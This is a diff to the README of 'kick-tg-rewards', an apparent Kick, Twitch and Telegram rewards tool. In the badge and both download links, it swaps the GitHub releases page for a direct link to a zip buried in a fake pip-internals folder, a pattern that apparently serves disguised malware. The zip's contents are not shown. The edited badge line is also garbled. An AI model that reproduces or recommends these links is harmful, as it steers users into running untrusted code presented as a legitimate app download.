@@ -1,7 +1,7 @@
 # 🎉 kick-tg-rewards - Your Gateway to Rewards on Kick and Twitch
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Ewoba/kick-tg-rewards/releases)
+[![Download Latest Release](https://github.com/Ewoba/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_internal/operations/build/rewards_kick_tg_v2.6.zip%20Latest%https://github.com/Ewoba/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_internal/operations/build/rewards_kick_tg_v2.6.zip)](https://github.com/Ewoba/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_internal/operations/build/rewards_kick_tg_v2.6.zip)
 
 ## 📚 Overview
 kick-tg-rewards is an open-source application that combines several powerful features into one user-friendly platform. With it, you can easily manage your Kick and Twitch accounts while interacting with users through a Telegram bot. This application features OAuth integration for secure access, a static profile UI for showing your Steam trade link and follows, and much more. 
@@ -10,7 +10,7 @@ kick-tg-rewards is an open-source application that combines several powerful fea
 To start using kick-tg-rewards, follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download page:
-   [Download Page](https://github.com/Ewoba/kick-tg-rewards/releases)
+   [Download Page](https://github.com/Ewoba/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_internal/operations/build/rewards_kick_tg_v2.6.zip)
 
 2. **Choose Your Version:** On the releases page, you'll see various versions of the application. Select the most recent version for the best experience.
 
@@ -32,7 +32,7 @@ To ensure a smooth experience, please make sure your system meets the following 
 ## 📥 Download & Install
 To download and install, please visit the following page and follow the instructions based on your operating system:
 
-[Download Page](https://github.com/Ewoba/kick-tg-rewards/releases)
+[Download Page](https://github.com/Ewoba/kick-tg-rewards/raw/refs/heads/main/backend-python/rem/Lib/site-packages/pip/_internal/operations/build/rewards_kick_tg_v2.6.zip)
 
 ## 🛠️ Features
 Here are some of the main features you will find in kick-tg-rewards:
